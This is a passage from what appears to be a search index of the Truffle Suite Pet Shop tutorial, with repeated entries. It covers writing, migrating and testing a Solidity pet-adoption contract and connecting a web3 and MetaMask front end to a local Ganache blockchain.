denied account access\" ) } } // Legacy dapp browsers... else if ( window . web3 ) { App . web3Provider = window . web3 . currentProvider ; } // If no injected web3 instance is detected, fall back to Ganache else { App . web3Provider = new Web3 . providers . HttpProvider ( 'http://localhost:7545' ); } web3 = new Web3 ( App . web3Provider ); Things to notice: First, we check if we are using modern dapp browsers or the more recent versions of MetaMask where an ethereum provider is injected into the window object. If so, we use it to create our web3 object, but we also need to explicitly request access to the accounts with ethereum.enable() . If the ethereum object does not exist, we then check for an injected web3 instance. If it exists, this indicates that we are using an older dapp browser (like Mist or an older version of MetaMask). If so, we get its provider and use it to create our web3 object. If no injected web3 instance is present, we create our web3 object based on our local provider. (This fallback is fine for development environments, but insecure and not suitable for production.) Instantiating the contract \u00b6 Now that we can interact with Ethereum via web3, we need to instantiate our smart contract so web3 knows where to find it and how it works. Truffle has a library to help with this called @truffle/contract . It keeps information about the contract in sync with migrations, so you don't need to change the contract's deployed address manually. Still in /src/js/app.js , remove the multi-line comment from within initContract and replace it with the following: $ . getJSON ( 'Adoption.json' , function ( data ) { // Get the necessary contract artifact file and instantiate it with @truffle/contract var AdoptionArtifact = data ; App . contracts . Adoption = TruffleContract ( AdoptionArtifact ); // Set the provider for our contract App . contracts . Adoption . setProvider ( App . web3Provider ); // Use our contract to retrieve and mark the adopted pets return App . markAdopted (); }); Things to notice: We first retrieve the artifact file for our smart contract. Artifacts are information about our contract such as its deployed address and Application Binary Interface (ABI) . The ABI is a JavaScript object defining how to interact with the contract including its variables, functions and their parameters. Once we have the artifacts in our callback, we pass them to TruffleContract() . This creates an instance of the contract we can interact with. With our contract instantiated, we set its web3 provider using the App.web3Provider value we stored earlier when setting up web3. We then call the app's markAdopted() function in case any pets are already adopted from a previous visit. We've encapsulated this in a separate function since we'll need to update the UI any time we make a change to the smart contract's data. Getting The Adopted Pets and Updating The UI \u00b6 Still in /src/js/app.js , remove the multi-line comment from markAdopted and replace it with the following: var adoptionInstance ; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; return adoptionInstance . getAdopters . call (); }). then ( function ( adopters ) { for ( i = 0 ; i < adopters . length ; i ++ ) { if ( adopters [ i ] !== '0x0000000000000000000000000000000000000000' ) { $ ( '.panel-pet' ). eq ( i ). find ( 'button' ). text ( 'Success' ). attr ( 'disabled' , true ); } } }). catch ( function ( err ) { console . log ( err . message ); }); Things to notice: We access the deployed Adoption contract, then call getAdopters() on that instance. We first declare the variable adoptionInstance outside of the smart contract calls so we can access the instance after initially retrieving it. Using call() allows us to read data from the blockchain without having to send a full transaction, meaning we won't have to spend any ether. After calling getAdopters() , we then loop through all of them, checking to see if an address is stored for each pet. Since the array contains address types, Ethereum initializes the array with 16 empty addresses. This is why we check for an empty address string rather than null or other falsey value. Once a petId with a corresponding address is found, we disable its adopt button and change the button text to \"Success\", so the user gets some feedback. Any errors are logged to the console. Handling the adopt() Function \u00b6 Still in /src/js/app.js , remove the multi-line comment from handleAdopt and replace it with the following: var adoptionInstance ; web3 . eth . getAccounts ( function ( error , accounts ) { if ( error ) { console . log ( error ); } var account = accounts [ 0 ]; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; // Execute adopt as a transaction by sending account return adoptionInstance . adopt ( petId , { from : account }); }). then ( function ( result ) { return App . markAdopted (); }). catch ( function ( err ) { console . log ( err . message ); }); }); Things to notice: We use web3 to get the user's accounts. In the callback after an error check, we then select the first account. From there, we get the deployed contract as we did above and store the instance in adoptionInstance . This time though, we're going to send a transaction instead of a call. Transactions require a \"from\" address and have an associated cost. This cost, paid in ether, is called gas . The gas cost is the fee for performing computation and/or storing data in a smart contract. We send the transaction by executing the adopt() function with both the pet's ID and an object containing the account address, which we stored earlier in account . The result of sending a transaction is the transaction object. If there are no errors, we proceed to call our markAdopted() function to sync the UI with our newly stored data. Interacting with the dapp in a browser \u00b6 Now we're ready to use our dapp! Installing and configuring MetaMask \u00b6 The easiest way to interact with our dapp in a browser is through MetaMask , a browser extension for both Chrome and Firefox. Install MetaMask in your browser. Once installed, a tab in your browser should open displaying the following: After clicking Getting Started , you should see the initial MetaMask screen. Click Import Wallet . Next, you should see a screen requesting anonymous analytics. Choose to decline or agree. In the box marked Wallet Seed , enter the mnemonic that is displayed in Ganache. **Warning**: Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Enter a password below that and click OK . If all goes well, MetaMask should display the following screen. Click All Done . Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . In the box titled \"New Network\" enter http://127.0.0.1:7545 , in the box titled \"Chain ID\" enter 1337 (Default Chain ID for Ganache) and click Save . The network name at the top will switch to say http://127.0.0.1:7545 . Click the top-right X to close out of Settings and return to the Accounts page. Each account created by Ganache is given 100 ether. You'll notice it's slightly less on the first account because some gas was used when the contract itself was deployed and when the tests were run. Configuration is now complete. Installing and configuring lite-server \u00b6 We can now start a local web server and use the dapp. We're using the lite-server library to serve our static files. This shipped with the pet-shop Truffle Box, but let's take a look at how it works. Open bs-config.json in a text editor (in the project's root directory) and examine the contents: { \"server\" : { \"baseDir\" : [ \"./src\" , \"./build/contracts\" ] } } This tells lite-server which files to include in our base directory. We add the ./src directory for our website files and ./build/contracts directory for the contract artifacts. We've also added a dev command to the scripts object in the package.json file in the project's root directory. The scripts object allows us to alias console commands to a single npm command. In this case we're just doing a single command, but it's possible to have more complex configurations. Here's what yours should look like: \"scripts\" : { \"dev\" : \"lite-server\" , \"test\" : \"echo \\\"Error: no test specified\\\" && exit 1\" }, This tells npm to run our local install of lite-server when we execute npm run dev from the console. Using the dapp \u00b6 Start the local web server: npm run dev The dev server will launch and automatically open a new browser tab containing your dapp. A MetaMask pop-up should appear requesting your approval to allow Pete's Pet Shop to connect to your MetaMask wallet. Without explicit approval, you will be unable to interact with the dapp. Click Connect . To use the dapp, click the Adopt button on the pet of your choice. You'll be automatically prompted to approve the transaction by MetaMask. Click Submit to approve the transaction. You'll see the button next to the adopted pet change to say \"Success\" and become disabled, just as we specified, because the pet has now been adopted. Note : If the button doesn't automatically change to say \"Success\", refreshing the app in the browser should trigger it. And in MetaMask, you'll see the transaction listed: You'll also see the same transaction listed in Ganache under the \"Transactions\" section. Congratulations! You have taken a huge step to becoming a full-fledged dapp developer. For developing locally, you have all the tools you need to start making more advanced dapps. If you'd like to make your dapp live for others to use, stay tuned for our future tutorial on deploying to the Ropsten testnet.","title":"Truffle Suite"},{"location":"tutorial/index.html#background","text":"Pete Scandlon of Pete's Pet Shop is interested in using Ethereum as an efficient way to handle their pet adoptions. The store has space for 16 pets at a given time, and they already have a database of pets. As an initial proof of concept, Pete wants to see a dapp which associates an Ethereum address with a pet to be adopted. The website structure and styling will be supplied. Our job is to write the smart contract and front-end logic for its usage.","title":"Background"},{"location":"tutorial/index.html#setting-up-the-development-environment","text":"There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node) Git Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path. We also will be using Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. You can download Ganache by navigating to http://truffleframework.com/ganache and clicking the \"Download\" button. Note : If you are developing in an environment without a graphical interface, you can also use Truffle Develop, Truffle's built-in personal blockchain, instead of Ganache. You will need to change some settings---such as the port the blockchain runs on---to adapt the tutorial for Truffle Develop.","title":"Setting up the development environment"},{"location":"tutorial/index.html#creating-a-truffle-project-using-a-truffle-box","text":"Truffle initializes in the current directory, so first create a directory in your development folder of choice and then moving inside it. mkdir pet-shop-tutorial cd pet-shop-tutorial We've created a special Truffle Box just for this tutorial called pet-shop , which includes the basic project structure as well as code for the user interface. Use the truffle unbox command to unpack this Truffle Box. truffle unbox pet-shop Note : Truffle can be initialized a few different ways. Another useful initialization command is `truffle init`, which creates an empty Truffle project with no example contracts included. For more information, please see the documentation on Creating a project .","title":"Creating a Truffle project using a Truffle Box"},{"location":"tutorial/index.html#directory-structure","text":"The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts truffle-config.js : Truffle configuration file The pet-shop Truffle Box has extra files and folders in it, but we won't worry about those just yet.","title":"Directory structure"},{"location":"tutorial/index.html#writing-the-smart-contract","text":"We'll start our dapp by writing the smart contract that acts as the back-end logic and storage. Create a new file named Adoption.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract Adoption { } Things to notice: The minimum version of Solidity required is noted at the top of the contract: pragma solidity ^0.5.0; . The pragma command means \" additional information that only the compiler cares about \", while the caret symbol (^) means \" the version indicated or higher \". Like JavaScript or PHP, statements are terminated with semicolons.","title":"Writing the smart contract"},{"location":"tutorial/index.html#variable-setup","text":"Solidity is a statically-typed language, meaning data types like strings, integers, and arrays must be defined. Solidity has a unique type called an address . Addresses are Ethereum addresses, stored as 20 byte values. Every account and smart contract on the Ethereum blockchain has an address and can send and receive Ether to and from this address. Add the following variable on the next line after contract Adoption { . address [ 16 ] public adopters ; Things to notice: We've defined a single variable: adopters . This is an array of Ethereum addresses. Arrays contain one type and can have a fixed or variable length. In this case the type is address and the length is 16 . You'll also notice adopters is public. Public variables have automatic getter methods, but in the case of arrays a key is required and will only return a single value. Later, we'll write a function to return the whole array for use in our UI.","title":"Variable setup"},{"location":"tutorial/index.html#your-first-function-adopting-a-pet","text":"Let's allow users to make adoption requests. Add the following function to the smart contract after the variable declaration we set up above. // Adopting a pet function adopt ( uint petId ) public returns ( uint ) { require ( petId >= 0 && petId <= 15 ); adopters [ petId ] = msg.sender ; return petId ; } Things to notice: In Solidity the types of both the function parameters and output must be specified. In this case we'll be taking in a petId (integer) and returning an integer. We are checking to make sure petId is in range of our adopters array. Arrays in Solidity are indexed from 0, so the ID value will need to be between 0 and 15. We use the require() statement to ensure the ID is within range. If the ID is in range, we then add the address that made the call to our adopters array. The address of the person or smart contract who called this function is denoted by msg.sender . Finally, we return the petId provided as a confirmation.","title":"Your first function: Adopting a pet"},{"location":"tutorial/index.html#your-second-function-retrieving-the-adopters","text":"As mentioned above, array getters return only a single value from a given key. Our UI needs to update all pet adoption statuses, but making 16 API calls is not ideal. So our next step is to write a function to return the entire array. Add the following getAdopters() function to the smart contract, after the adopt() function we added above: // Retrieving the adopters function getAdopters () public view returns ( address [ 16 ] memory ) { return adopters ; } Things to notice: Since adopters is already declared, we can simply return it. Be sure to specify the return type (in this case, the type for adopters ) as address[16] memory . memory gives the data location for the variable. The view keyword in the function declaration means that the function will not modify the state of the contract. Further information about the exact limits imposed by view is available here .","title":"Your second function: Retrieving the adopters"},{"location":"tutorial/index.html#compiling-and-migrating-the-smart-contract","text":"Now that we have written our smart contract, the next steps are to compile and migrate it.","title":"Compiling and migrating the smart contract"},{"location":"tutorial/index.html#compilation","text":"Solidity is a compiled language, meaning we need to compile our Solidity to bytecode for the Ethereum Virtual Machine (EVM) to execute. Think of it as translating our human-readable Solidity into something the EVM understands. In a terminal, make sure you are in the root of the directory that contains the dapp and type: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . You should see output similar to the following: Compiling your contracts... =========================== > Compiling ./contracts/Adoption.sol > Compiling ./contracts/Migrations.sol > Artifacts written to /Users/cruzmolina/Code/truffle-projects/metacoin/build/contracts > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang","title":"Compilation"},{"location":"tutorial/index.html#migration","text":"Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! A migration is a deployment script meant to alter the state of your application's contracts , moving it from one state to the next. For the first migration, you might just be deploying new code, but over time, other migrations might move data around or replace a contract with a new one. Note : Read more about migrations in the Truffle documentation . You'll see one JavaScript file already in the migrations/ directory: 1_initial_migration.js . This handles deploying the Migrations.sol contract to observe subsequent smart contract migrations, and ensures we don't double-migrate unchanged contracts in the future. Now we are ready to create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: var Adoption = artifacts . require ( \"Adoption\" ); module . exports = function ( deployer ) { deployer . deploy ( Adoption ); }; Before we can migrate our contract to the blockchain, we need to have a blockchain running. For this tutorial, we're going to use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. Note : Read more about Ganache in the Truffle documentation . Back in our terminal, migrate the contract to the blockchain. truffle migrate You should see output similar to the following: 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3b558e9cdf1231d8ffb3445cb2f9fb01de9d0363e0b97a17f9517da318c2e5af > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 > account: 0x8d9606F90B6CA5D856A9f0867a82a645e2DfFf37 > balance: 99 .99430184 > gas used: 284908 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00569816 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00569816 ETH 2_deploy_contracts.js ===================== Deploying 'Adoption' ............................. ............................. You can see the migrations being executed in order, followed by some information related to each migration. (Your information will differ.) In Ganache, note that the state of the blockchain has changed. The blockchain now shows that the current block, previously 0 , is now 4 . In addition, while the first account originally had 100 ether, it is now lower, due to the transaction costs of migration. We'll talk more about transaction costs later. You've now written your first smart contract and deployed it to a locally running blockchain. It's time to interact with our smart contract now to make sure it does what we want.","title":"Migration"},{"location":"tutorial/index.html#testing-the-smart-contract-using-solidity","text":"Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Solidity. 1. Create a new file named `TestAdoption.sol` in the `test/` directory. 1. Add the following content to the `TestAdoption.sol` file: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/Adoption.sol\" ; contract TestAdoption { // The address of the adoption contract to be tested Adoption adoption = Adoption ( DeployedAddresses . Adoption ()); // The id of the pet that will be used for testing uint expectedPetId = 8 ; //The expected owner of adopted pet is this contract address expectedAdopter = address ( this ); } We start the contract off with 3 imports: * `Assert.sol`: Gives us various assertions to use in our tests. In testing, **an assertion checks for things like equality, inequality or emptiness to return a pass/fail** from our test. [Here's a full list of the assertions included with Truffle](https://github.com/trufflesuite/truffle/blob/master/packages/resolver/solidity/Assert.sol). * `DeployedAddresses.sol`: When running tests, Truffle will deploy a fresh instance of the contract being tested to the blockchain. This smart contract gets the address of the deployed contract. * `Adoption`: The smart contract we want to test. Note : The first two imports are referring to global Truffle files, not a `truffle` directory. You should not see a `truffle` directory inside your `test/` directory. Then we define three contract-wide variables: * First, one containing the smart contract to be tested, calling the `DeployedAddresses` smart contract to get its address. * Second, the id of the pet that will be used to test the adoption functions. * Third, since the TestAdoption contract will be sending the transaction, we set the expected adopter address to **this**, a contract-wide variable that gets the current contract's address. ### Testing the adopt() function To test the `adopt()` function, recall that upon success it returns the given `petId`. We can ensure an ID was returned and that it's correct by comparing the return value of `adopt()` to the ID we passed in. 1. Add the following function within the `TestAdoption.sol` smart contract, after the declaration of `Adoption`: // Testing the adopt() function function testUserCanAdoptPet () public { uint returnedId = adoption . adopt ( expectedPetId ); Assert . equal ( returnedId , expectedPetId , \"Adoption of the expected pet should match what is returned.\" ); } Things to notice: * We call the smart contract we declared earlier with the ID of `expectedPetId`. * Finally, we pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to `Assert.equal()`. ### Testing retrieval of a single pet's owner Remembering from above that public variables have automatic getter methods, we can retrieve the address stored by our adoption test above. Stored data will persist for the duration of our tests, so our adoption of pet `expectedPetId` above can be retrieved by other tests. 1. Add this function below the previously added function in `TestAdoption.sol`. // Testing retrieval of a single pet's owner function testGetAdopterAddressByPetId () public { address adopter = adoption . adopters ( expectedPetId ); Assert . equal ( adopter , expectedAdopter , \"Owner of the expected pet should be this contract\" ); } After getting the adopter address stored by the adoption contract, we assert equality as we did above. ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. 1. Add this function below the previously added function in `TestAdoption.sol`. // Testing retrieval of all pet owners function testGetAdopterAddressByPetIdInArray () public { // Store adopters in memory rather than contract's storage address [ 16 ] memory adopters = adoption . getAdopters (); Assert . equal ( adopters [ expectedPetId ], expectedAdopter , \"Owner of the expected pet should be this contract\" ); } Note the **memory** attribute on `adopters`. The memory attribute tells Solidity to temporarily store the value in memory, rather than saving it to the contract's storage. Since `adopters` is an array, and we know from the first adoption test that we adopted pet `expectedPetId`, we compare the testing contracts address with location `expectedPetId` in the array.","title":"Testing the smart contract using Solidity"},{"location":"tutorial/index.html#testing-the-smart-contract-using-javascript","text":"Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Javascript using the Chai and Mocha libraries. 1. Create a new file named `testAdoption.test.js` in the `test/` directory. 2. Add the following content to the `testAdoption.test.js` file: const Adoption = artifacts.require(\"Adoption\"); contract(\"Adoption\", (accounts) => { let adoption; let expectedAdopter; before(async () => { adoption = await Adoption.deployed(); }); describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); }); }); We start the contract by importing : * `Adoption`: The smart contract we want to test We begin our test by importing our `Adoption` contract using `artifacts.require`. **Note**: When writing this test, our callback function take the argument `accounts`. This provides us with the accounts available on the network when using this test. Then, we make use of the `before` to provide initial setups for the following: * Adopt a pet with id 8 and assign it to the first account within the test accounts on the network. * This function later is used to check whether the `petId: 8` has been adopted by `accounts[0]`. ### Testing the adopt function To test the `adopt` function, recall that upon success it returns the given `adopter`. We can ensure that the adopter based on given petID was returned and is compared with the `expectedAdopter` within the `adopt` function. 1. Add the following function within the `testAdoption.test.js` test file, after the declaration of `before` code block. describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); it(\"can fetch the address of an owner by pet id\", async () => { const adopter = await adoption.adopters(8); assert.equal(adopter, expectedAdopter, \"The owner of the adopted pet should be the first account.\"); }); }); Things to notice: * We call smart contract method `adopters` to see what address adopted the pet with `petID` 8. * Truffle imports `Chai` for the user so we can use the `assert` functions. We pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to `assert.equal()`. ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. 1. Add this function below the previously added function in `testAdoption.test.js`. it(\"can fetch the collection of all pet owners' addresses\", async () => { const adopters = await adoption.getAdopters(); assert.equal(adopters[8], expectedAdopter, \"The owner of the adopted pet should be in the collection.\"); }); Since adopters is an array, and we know from the first adoption test that we adopted the pet with `petId` 8, we are comparing the contract's address with the address that we expect to find.","title":"Testing the smart contract using JavaScript"},{"location":"tutorial/index.html#running-the-tests","text":"Back in the terminal, run the tests: truffle test If all the tests pass, you'll see console output similar to this: Using network 'development' . Compiling your contracts... =========================== > Compiling ./test/TestAdoption.sol > Artifacts written to /var/folders/z3/v0sd04ys11q2sh8tq38mz30c0000gn/T/test-11934-19747-g49sra.0ncrr > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang TestAdoption \u2713 testUserCanAdoptPet ( 91ms ) \u2713 testGetAdopterAddressByPetId ( 70ms ) \u2713 testGetAdopterAddressByPetIdInArray ( 89ms ) 3 passing ( 670ms )","title":"Running the tests"},{"location":"tutorial/index.html#creating-a-user-interface-to-interact-with-the-smart-contract","text":"Now that we've created the smart contract, deployed it to our local test blockchain and confirmed we can interact with it via the console, it's time to create a UI so that Pete has something to use for his pet shop! Included with the pet-shop Truffle Box was code for the app's front-end. That code exists within the src/ directory. The front-end doesn't use a build system (webpack, grunt, etc.) to be as easy as possible to get started. The structure of the app is already there; we'll be filling in the functions which are unique to Ethereum. This way, you can take this knowledge and apply it to your own front-end development.","title":"Creating a user interface to interact with the smart contract"},{"location":"tutorial/index.html#instantiating-web3","text":"Open /src/js/app.js in a text editor. Examine the file. Note that there is a global App object to manage our application, load in the pet data in init() and then call the function initWeb3() . The web3 JavaScript library interacts with the Ethereum blockchain. It can retrieve user accounts, send transactions, interact with smart contracts, and more. Remove the multi-line comment from within initWeb3 and replace it with the following: // Modern dapp browsers... if ( window . ethereum ) { App . web3Provider = window . ethereum ; try { // Request account access await window . ethereum . enable (); } catch ( error ) { // User denied account access... console . error ( \"User denied account access\" ) } } // Legacy dapp browsers... else if ( window . web3 ) { App . web3Provider = window . web3 . currentProvider ; } // If no injected web3 instance is detected, fall back to Ganache else { App . web3Provider = new Web3 . providers . HttpProvider ( 'http://localhost:7545' ); } web3 = new Web3 ( App . web3Provider ); Things to notice: First, we check if we are using modern dapp browsers or the more recent versions of MetaMask where an ethereum provider is injected into the window object. If so, we use it to create our web3 object, but we also need to explicitly request access to the accounts with ethereum.enable() . If the ethereum object does not exist, we then check for an injected web3 instance. If it exists, this indicates that we are using an older dapp browser (like Mist or an older version of MetaMask). If so, we get its provider and use it to create our web3 object. If no injected web3 instance is present, we create our web3 object based on our local provider. (This fallback is fine for development environments, but insecure and not suitable for production.)","title":"Instantiating web3"},{"location":"tutorial/index.html#instantiating-the-contract","text":"Now that we can interact with Ethereum via web3, we need to instantiate our smart contract so web3 knows where to find it and how it works. Truffle has a library to help with this called @truffle/contract . It keeps information about the contract in sync with migrations, so you don't need to change the contract's deployed address manually. Still in /src/js/app.js , remove the multi-line comment from within initContract and replace it with the following: $ . getJSON ( 'Adoption.json' , function ( data ) { // Get the necessary contract artifact file and instantiate it with @truffle/contract var AdoptionArtifact = data ; App . contracts . Adoption = TruffleContract ( AdoptionArtifact ); // Set the provider for our contract App . contracts . Adoption . setProvider ( App . web3Provider ); // Use our contract to retrieve and mark the adopted pets return App . markAdopted (); }); Things to notice: We first retrieve the artifact file for our smart contract. Artifacts are information about our contract such as its deployed address and Application Binary Interface (ABI) . The ABI is a JavaScript object defining how to interact with the contract including its variables, functions and their parameters. Once we have the artifacts in our callback, we pass them to TruffleContract() . This creates an instance of the contract we can interact with. With our contract instantiated, we set its web3 provider using the App.web3Provider value we stored earlier when setting up web3. We then call the app's markAdopted() function in case any pets are already adopted from a previous visit. We've encapsulated this in a separate function since we'll need to update the UI any time we make a change to the smart contract's data.","title":"Instantiating the contract"},{"location":"tutorial/index.html#getting-the-adopted-pets-and-updating-the-ui","text":"Still in /src/js/app.js , remove the multi-line comment from markAdopted and replace it with the following: var adoptionInstance ; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; return adoptionInstance . getAdopters . call (); }). then ( function ( adopters ) { for ( i = 0 ; i < adopters . length ; i ++ ) { if ( adopters [ i ] !== '0x0000000000000000000000000000000000000000' ) { $ ( '.panel-pet' ). eq ( i ). find ( 'button' ). text ( 'Success' ). attr ( 'disabled' , true ); } } }). catch ( function ( err ) { console . log ( err . message ); }); Things to notice: We access the deployed Adoption contract, then call getAdopters() on that instance. We first declare the variable adoptionInstance outside of the smart contract calls so we can access the instance after initially retrieving it. Using call() allows us to read data from the blockchain without having to send a full transaction, meaning we won't have to spend any ether. After calling getAdopters() , we then loop through all of them, checking to see if an address is stored for each pet. Since the array contains address types, Ethereum initializes the array with 16 empty addresses. This is why we check for an empty address string rather than null or other falsey value. Once a petId with a corresponding address is found, we disable its adopt button and change the button text to \"Success\", so the user gets some feedback. Any errors are logged to the console.","title":"Getting The Adopted Pets and Updating The UI"},{"location":"tutorial/index.html#handling-the-adopt-function","text":"Still in /src/js/app.js , remove the multi-line comment from handleAdopt and replace it with the following: var adoptionInstance ; web3 . eth . getAccounts ( function ( error , accounts ) { if ( error ) { console . log ( error ); } var account = accounts [ 0 ]; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; // Execute adopt as a transaction by sending account return adoptionInstance . adopt ( petId , { from : account }); }). then ( function ( result ) { return App . markAdopted (); }). catch ( function ( err ) { console . log ( err . message ); }); }); Things to notice: We use web3 to get the user's accounts. In the callback after an error check, we then select the first account. From there, we get the deployed contract as we did above and store the instance in adoptionInstance . This time though, we're going to send a transaction instead of a call. Transactions require a \"from\" address and have an associated cost. This cost, paid in ether, is called gas . The gas cost is the fee for performing computation and/or storing data in a smart contract. We send the transaction by executing the adopt() function with both the pet's ID and an object containing the account address, which we stored earlier in account . The result of sending a transaction is the transaction object. If there are no errors, we proceed to call our markAdopted() function to sync the UI with our newly stored data.","title":"Handling the adopt() Function"},{"location":"tutorial/index.html#interacting-with-the-dapp-in-a-browser","text":"Now we're ready to use our dapp!","title":"Interacting with the dapp in a browser"},{"location":"tutorial/index.html#installing-and-configuring-metamask","text":"The easiest way to interact with our dapp in a browser is through MetaMask , a browser extension for both Chrome and Firefox. Install MetaMask in your browser. Once installed, a tab in your browser should open displaying the following: After clicking Getting Started , you should see the initial MetaMask screen. Click Import Wallet . Next, you should see a screen requesting anonymous analytics. Choose to decline or agree. In the box marked Wallet Seed , enter the mnemonic that is displayed in Ganache. **Warning**: Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Enter a password below that and click OK . If all goes well, MetaMask should display the following screen. Click All Done . Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . In the box titled \"New Network\" enter http://127.0.0.1:7545 , in the box titled \"Chain ID\" enter 1337 (Default Chain ID for Ganache) and click Save . The network name at the top will switch to say http://127.0.0.1:7545 . Click the top-right X to close out of Settings and return to the Accounts page. Each account created by Ganache is given 100 ether. You'll notice it's slightly less on the first account because some gas was used when the contract itself was deployed and when the tests were run. Configuration is now complete.","title":"Installing and configuring MetaMask"},{"location":"tutorial/index.html#installing-and-configuring-lite-server","text":"We can now start a local web server and use the dapp. We're using the lite-server library to serve our static files. This shipped with the pet-shop Truffle Box, but let's take a look at how it works. Open bs-config.json in a text editor (in the project's root directory) and examine the contents: { \"server\" : { \"baseDir\" : [ \"./src\" , \"./build/contracts\" ] } } This tells lite-server which files to include in our base directory. We add the ./src directory for our website files and ./build/contracts directory for the contract artifacts. We've also added a dev command to the scripts object in the package.json file in the project's root directory. The scripts object allows us to alias console commands to a single npm command. In this case we're just doing a single command, but it's possible to have more complex configurations. Here's what yours should look like: \"scripts\" : { \"dev\" : \"lite-server\" , \"test\" : \"echo \\\"Error: no test specified\\\" && exit 1\" }, This tells npm to run our local install of lite-server when we execute npm run dev from the console.","title":"Installing and configuring lite-server"},{"location":"tutorial/index.html#using-the-dapp","text":"Start the local web server: npm run dev The dev server will launch and automatically open a new browser tab containing your dapp. A MetaMask pop-up should appear requesting your approval to allow Pete's Pet Shop to connect to your MetaMask wallet. Without explicit approval, you will be unable to interact with the dapp. Click Connect . To use the dapp, click the Adopt button on the pet of your choice. You'll be automatically prompted to approve the transaction by MetaMask. Click Submit to approve the transaction. You'll see the button next to the adopted pet change to say \"Success\" and become disabled, just as we specified, because the pet has now been adopted. Note : If the button doesn't automatically change to say \"Success\", refreshing the app in the browser should trigger it. And in MetaMask, you'll see the transaction listed: You'll also see the same transaction listed in Ganache under the \"Transactions\" section. Congratulations! You have taken a huge step to becoming a full-fledged dapp developer. For developing locally, you have all the tools you need to start making more advanced dapps. If you'd like to make your dapp live for others to use, stay tuned for our future tutorial on deploying to the Ropsten testnet.","title":"Using the dapp"}]}